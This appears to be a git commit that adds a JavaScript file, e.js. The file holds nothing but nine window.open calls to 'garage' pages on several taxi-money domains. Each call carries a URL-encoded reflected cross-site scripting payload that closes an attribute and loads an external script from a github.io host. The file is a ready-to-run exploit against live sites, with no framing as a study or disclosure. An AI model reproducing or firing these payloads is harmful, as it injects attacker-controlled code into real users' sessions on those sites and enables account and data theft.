aa30934c52792edc78f997e04a581b2be97b148d
berdos1989 <116584162+berdos1989@users.noreply.github.com>
2023-04-16 14:17:40 +0300

    Create e.js

---
+++ e.js
@@ -0,0 +1,9 @@
+window.open("https://taxi-money.net/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.me/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.info/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.in/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.eu/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.org/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://money.taxi/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.be/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
+window.open("https://taxi-money.icu/garage?type=%22%3E%3Cscript%20src=%22//berdos1989.github.io/script.js%22%3E%3C/script%3E%3Cdiv%20id=%22xxxx&active_preset=1");
